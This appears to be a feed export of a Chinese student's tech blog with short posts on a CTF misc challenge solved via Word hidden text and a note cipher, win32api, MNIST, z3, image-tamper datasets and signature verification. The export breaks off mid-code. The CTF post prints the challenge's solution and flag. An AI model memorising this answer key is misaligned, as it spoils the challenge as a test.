      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20word%E7%9A%84%E5%A5%87%E8%91%A9%E5%8A%9F%E8%83%BD--%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20word%E7%9A%84%E5%A5%87%E8%91%A9%E5%8A%9F%E8%83%BD--%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  word的奇葩功能–隐藏文字</p><h1 id="word的奇葩功能–隐藏文字"><a href="#word的奇葩功能–隐藏文字" class="headerlink" title="word的奇葩功能–隐藏文字"></a>word的奇葩功能–隐藏文字</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402002628860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">这是一个rar文件，但是感觉有点怪怪的。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402002713570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">把文件头改了，大概率就可以打开rar了。</p><p>出现一个docx文档。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402002819895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 啥都没有</p><p>现在就来讲一讲word的隐藏文字功能。。。。。有点邪门的。<br> 就是不知道有没有方法从源文件就可以知道隐藏文字的内容。方法肯定是有的，毕竟信息就在那里。也不知道word是怎么编码的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402002232202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">点击文字内容，右击字体选项，即可进入此界面</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402002415724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 点击隐藏文字选项后</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021040200244832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 就全没了</p><p>需要全选，再把隐藏文字选项取消才能够重现。</p><p>既然是<strong>音符</strong>，那么就搜索<strong>音符解码</strong>就好了。这些misc题目用到奇奇怪怪的密码的时候总是这个尿性。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210402003233457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p>MRCTF{thEse_n0tes_ArE_am@zing~}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win32api查看屏幕分辨率error</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20win32api%E6%9F%A5%E7%9C%8B%E5%B1%8F%E5%B9%95%E5%88%86%E8%BE%A8%E7%8E%87error/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20win32api%E6%9F%A5%E7%9C%8B%E5%B1%8F%E5%B9%95%E5%88%86%E8%BE%A8%E7%8E%87error/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  win32api查看屏幕分辨率error</p><h1 id="win32api查看屏幕分辨率error"><a href="#win32api查看屏幕分辨率error" class="headerlink" title="win32api查看屏幕分辨率error"></a>win32api查看屏幕分辨率error</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import win32api</span><br><span class="line">print(win32api.GetSystemMetrics(win32con.SM_CXSCREEN))</span><br><span class="line">print(win32api.GetSystemMetrics(win32con.SM_CYSCREEN))</span><br><span class="line"></span><br><span class="line"># 1536   864</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现一个很有趣的现象，调用window api ,查看屏幕分辨率，得出的分辨率大小和实际的不相符</p><p>这个大小实际上是真实分辨率大小的80%</p><p>但是使用tk查看的分辨率大小是和实际分辨率大小一致的。<br> 而tk本质上就是调用了这个api函数，得到的结果却不同</p>]]></content>
      
      
      <categories>
          
          <category> cv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用MNIST数据集并显示一些图片</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E4%BD%BF%E7%94%A8MNIST%E6%95%B0%E6%8D%AE%E9%9B%86%E5%B9%B6%E6%98%BE%E7%A4%BA%E4%B8%80%E4%BA%9B%E5%9B%BE%E7%89%87/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E4%BD%BF%E7%94%A8MNIST%E6%95%B0%E6%8D%AE%E9%9B%86%E5%B9%B6%E6%98%BE%E7%A4%BA%E4%B8%80%E4%BA%9B%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  使用MNIST数据集并显示一些图片</p><h1 id="使用MNIST数据集并显示一些图片"><a href="#使用MNIST数据集并显示一些图片" class="headerlink" title="使用MNIST数据集并显示一些图片"></a>使用MNIST数据集并显示一些图片</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> datasets</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一些超参数</span></span><br><span class="line">batch_size = <span class="number">64</span></span><br><span class="line">learning_rate = <span class="number">0.02</span></span><br><span class="line">num_epoches = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据预处理。transforms.ToTensor()将图片转换成PyTorch中处理的对象Tensor,并且进行标准化（数据在0~1之间）</span></span><br><span class="line"><span class="comment"># transforms.Normalize()做归一化。它进行了减均值，再除以标准差。两个参数分别是均值和标准差</span></span><br><span class="line"><span class="comment"># transforms.Compose()函数则是将各种预处理的操作组合到了一起</span></span><br><span class="line">data_tf = transforms.Compose(</span><br><span class="line">    [transforms.ToTensor(),</span><br><span class="line">     transforms.Normalize([<span class="number">0.5</span>], [<span class="number">0.5</span>])])</span><br><span class="line"><span class="comment"># 数据集的下载器</span></span><br><span class="line">train_dataset = datasets.MNIST(</span><br><span class="line">    root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">True</span>, transform=data_tf, download=<span class="literal">True</span>)</span><br><span class="line">test_dataset = datasets.MNIST(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">False</span>, transform=data_tf)</span><br><span class="line">train_loader = DataLoader(train_dataset, batch_size=batch_size, shuffle=<span class="literal">True</span>)</span><br><span class="line">test_loader = DataLoader(test_dataset, batch_size=batch_size, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(test_loader))</span><br><span class="line">img = torchvision.utils.make_grid(test_dataset[<span class="number">1</span>][<span class="number">0</span>]).numpy()</span><br><span class="line">plt.imshow(np.transpose(img,(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)))</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3安装到Anaconda环境_突然成功</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20z3%E5%AE%89%E8%A3%85%E5%88%B0Anaconda%E7%8E%AF%E5%A2%83_%E7%AA%81%E7%84%B6%E6%88%90%E5%8A%9F/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20z3%E5%AE%89%E8%A3%85%E5%88%B0Anaconda%E7%8E%AF%E5%A2%83_%E7%AA%81%E7%84%B6%E6%88%90%E5%8A%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  z3安装到Anaconda环境_突然成功</p><h1 id="z3安装到Anaconda环境-突然成功"><a href="#z3安装到Anaconda环境-突然成功" class="headerlink" title="z3安装到Anaconda环境_突然成功"></a>z3安装到Anaconda环境_突然成功</h1><p><img alt="安装z3成功" src="https://img-blog.csdnimg.cn/20210321233213135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 此前多次安装python z3库未果，会在安装到一半 时候跳出提示，写了一大堆的网址，总之是没有跳出success。<br> 根据上古材料显示，z3只能安装在python2上面。于是安装在kali linux 上的python2上，但是安装在虚拟机上总是用起来不顺，也没有在虚拟机上安装ide。<br> 在某一个没有星星的夜晚，偶然想起来一句神秘指令</p><blockquote></blockquote><p>pip install z3-solver</p><p>幸甚至哉<br> 水文+1</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可能有用的篡改检测常识</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B%E5%B8%B8%E8%AF%86/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B%E5%B8%B8%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  可能有用的篡改检测常识</p><h1 id="可能有用的篡改检测常识"><a href="#可能有用的篡改检测常识" class="headerlink" title="可能有用的篡改检测常识"></a>可能有用的篡改检测常识</h1><blockquote></blockquote><p>Deep learning-based Technique for Image Tamper Detection</p><p>图像篡改检测方向的2021年的综述，主要介绍一些深度学习方法的优缺点。但是逻辑方面感觉有点不对。</p><blockquote></blockquote><p>Proceedings of the Third International Conference on Intelligent<br> Communication Technologies and Virtual Mobile Networks (ICICV 2021).<br> IEEE Xplore Part Number: CFP21ONG-ART; 978-0-7381-1183-4</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d7a5e48e380b42de9b2016c862f83404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5d1fdd607e634764907756049b2a4f3c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p><strong>脆弱水印</strong>：对图像的任何修改做出反应，由相当的敏感性，认为不大适合篡改检测任务。<br> <strong>半脆弱水印</strong>：只有对于内容的大的篡改反应，而不对一些用户常见的非恶意的图像操作反应。<br> <strong>稳定水印</strong>：在大多数情况下都会保留，即使是做了强的恶意篡改。估计是和采样点有点关系。一般不考虑作为篡改检测的依据。而在于产权的保护。</p><h1 id="常用领域"><a href="#常用领域" class="headerlink" title="常用领域"></a>常用领域</h1><blockquote></blockquote><p>forensics, industrial photography, e-commerce, and medical imaging</p><p><strong>司法鉴定、工业摄影、电子商务和医学成像</strong></p><blockquote></blockquote><p>The most common categories of non-natural distortions of digital<br> images are splicing [3], copy-move [1,2], and resampling [4].</p><p><strong>splicing<br> copy-move<br> resampling</strong></p><p>resampling 其实大多数人不把它当作是图像的篡改，认为图像经过resampling 之后检测出的篡改痕迹是一种误检。</p><h2 id="数据集性质"><a href="#数据集性质" class="headerlink" title="数据集性质"></a>数据集性质</h2><h3 id="有记录的第一个-司法性质的图像篡改分析"><a href="#有记录的第一个-司法性质的图像篡改分析" class="headerlink" title="有记录的第一个 司法性质的图像篡改分析"></a>有记录的第一个 司法性质的图像篡改分析</h3><blockquote></blockquote><p>是由MarcusA.Root在摄影的早期进行的。<br> 西班牙女演员安娜·艾伦的社交媒体报道报道了最近的一张拼接照片，她参加了在美国洛杉矶举行的第87届奥斯卡颁奖典礼</p><blockquote></blockquote><p>如图所示。1.原始图像(图。1(a))是波兰女演员兼模特卡西娅·斯穆特尼亚克，在2013年罗马电影节期间拍摄。安娜的头被剪在卡西亚的身体上，创造了这个假货(图。1(b))。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像篡改常用数据集casia</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86casia/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86casia/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  图像篡改常用数据集casia</p><h1 id="图像篡改常用数据集casia"><a href="#图像篡改常用数据集casia" class="headerlink" title="图像篡改常用数据集casia"></a>图像篡改常用数据集casia</h1><blockquote></blockquote><p>摘自论文 <strong>CASIA IMAGE TAMPERING DETECTION EVALUATION DATABASE</strong></p><p>2013年发表的论文。</p><p>CASIA 数据集是<strong>Institute of Automation, Chinese Academy of Sciences</strong> 国人所作，中科院自动化研究所。</p><h2 id="以下内容是瞎猜的"><a href="#以下内容是瞎猜的" class="headerlink" title="以下内容是瞎猜的"></a>以下内容是瞎猜的</h2><p><strong>C</strong>hinese <strong>A</strong>cademy of <strong>S</strong>ciences ， 估计CAS是这个的缩写。</p><p>而这个<strong>IA</strong>可能是这个。不明原因，iA这个词就有只能自动的含义。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4ab04491802c400e806ca69e6ea1fef3.png"><br> 所以就是<strong>CASIA &#x3D; CAS + IA&#x3D;中科院 自动化</strong></p><p>就图像篡改数据集而言，是相对其他任务更加容易获得的，单张篡改图像的制作难度很低，但是多样的篡改数据，适合训练的篡改数据难以制作。但是制作数据集的难度还是比较低的。所以会有不少人自己做数据集训练。</p><h2 id="CASIA-和Columbia"><a href="#CASIA-和Columbia" class="headerlink" title="CASIA 和Columbia"></a>CASIA 和Columbia</h2><h2 id="CASIA-v2-0"><a href="#CASIA-v2-0" class="headerlink" title="CASIA v2.0"></a>CASIA v2.0</h2><h2 id="CASIA-v1-0"><a href="#CASIA-v1-0" class="headerlink" title="CASIA v1.0"></a>CASIA v1.0</h2><h2 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h2><h2 id="比较Columbia-优势"><a href="#比较Columbia-优势" class="headerlink" title="比较Columbia 优势"></a>比较Columbia 优势</h2><blockquote></blockquote><p>就有一些论文，喜欢在Columbia里面测试，还说什么<strong>act very well in Columbia</strong>，结果展示还只放这个数据集的图。这个测试其实意义不大，如果人一眼就看出来，那为什么还要机器呢。</p><h2 id="数据集特点"><a href="#数据集特点" class="headerlink" title="数据集特点"></a>数据集特点</h2><h2 id="数据集链接"><a href="#数据集链接" class="headerlink" title="数据集链接"></a>数据集链接</h2><p>论文中数据集链接，已测试，无法连接，像是外网网址。</p><p><a href="http://forensics.idealtest.org/">The databases are now availiable online at http://forensics.idealtest.org/</a></p><p>改用其他途径，可以轻松搜索到</p>]]></content>
      
      
      <categories>
          
          <category> 数据集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求因子数量的函数</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E6%B1%82%E5%9B%A0%E5%AD%90%E6%95%B0%E9%87%8F%E7%9A%84%E5%87%BD%E6%95%B0/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E6%B1%82%E5%9B%A0%E5%AD%90%E6%95%B0%E9%87%8F%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  求因子数量的函数</p><h1 id="求因子数量的函数"><a href="#求因子数量的函数" class="headerlink" title="求因子数量的函数"></a>求因子数量的函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int search(int n)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int s,t;</span><br><span class="line">int num=0;</span><br><span class="line">t=0;</span><br><span class="line">for(i=1,s=0;i&amp;lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">s+=n/i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">for(i=1,t=0;i&amp;lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">t+=(n-1)/i;</span><br><span class="line">&#125;</span><br><span class="line">num=s-t;</span><br><span class="line">return num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求因子数量的函数<br> 复杂度可能挺大的；</p>]]></content>
      
      
      <categories>
          
          <category> acm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用基于分形系统的离线签名方法</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E4%BD%BF%E7%94%A8%E5%9F%BA%E4%BA%8E%E5%88%86%E5%BD%A2%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%A6%BB%E7%BA%BF%E7%AD%BE%E5%90%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E4%BD%BF%E7%94%A8%E5%9F%BA%E4%BA%8E%E5%88%86%E5%BD%A2%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%A6%BB%E7%BA%BF%E7%AD%BE%E5%90%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  使用基于分形系统的离线签名方法</p><h1 id="使用基于分形系统的离线签名方法"><a href="#使用基于分形系统的离线签名方法" class="headerlink" title="使用基于分形系统的离线签名方法"></a>使用基于分形系统的离线签名方法</h1><h2 id="使用基于分形系统的离线签名方法-1"><a href="#使用基于分形系统的离线签名方法-1" class="headerlink" title="使用基于分形系统的离线签名方法"></a>使用基于分形系统的离线签名方法</h2><blockquote></blockquote><p>主要参考文献：<br> （基于分形理论的离线签名鉴别系统 叶秀芬，裴志，王杰）</p><p>完全使用C语言编写，使用opencv库<br> 使用<strong>二值化，归一化</strong>，进行图像预处理后，使得图像可以比较。<br> 求出他的分形维度特征，利用分形维数作为提取的特征，<strong>分形维数定量地表述了分形物体的形状和复杂性。</strong><br> 用分形理论进行图像分析的原理是利用图像的分形维数特征进行分析。分形维数直观上与物体表面的粗糙程度相吻合,而自然界不同物体粗糙程度有很大差别，因此可用分形维数作为区别不同类别物体的有效参数。分形维数反映了人们对物体表面粗糙程度的<br> 感受，又具有尺度变换下不变性这个性质，因而该参<br> 数在图像分析中有着广泛的应用前景。</p><p>本次使用<strong>盒子维</strong>作为较容易求的<strong>分形维度</strong>。<br> 依据论文，分形维度求法为，讲图像分为多个小方块，对于图像中每一个小方块计算最大灰度和最小灰度的差值，再将 差值&#x2F;小方块边长(ε) 累加，得到N，得到(logN,logξ)的序列；<br> 重复上述操作多次，得到多个(logN,logξ)的序列<br> 使用最小二乘法，求出这些点集的斜率。斜率就是图像的分形维度。<br> 对于决策部分，论文使用了贝叶斯决策作为判断依据，<br> 我直接使用样本相似度进行判断。对于相似度不足 90%的样本直接判断为假冒样本。<br> 对于训练集 ，求出他的分形维度平均数<br> 对于sample集合，对于每一个图像的分形维数进行判断，误差率&gt;&#x3D;10%的图像计为假签名,<strong>误差率可以根据情况调整</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include&amp;lt;stdio.h&amp;gt;</span><br><span class="line">#include&amp;lt;math.h&amp;gt;</span><br><span 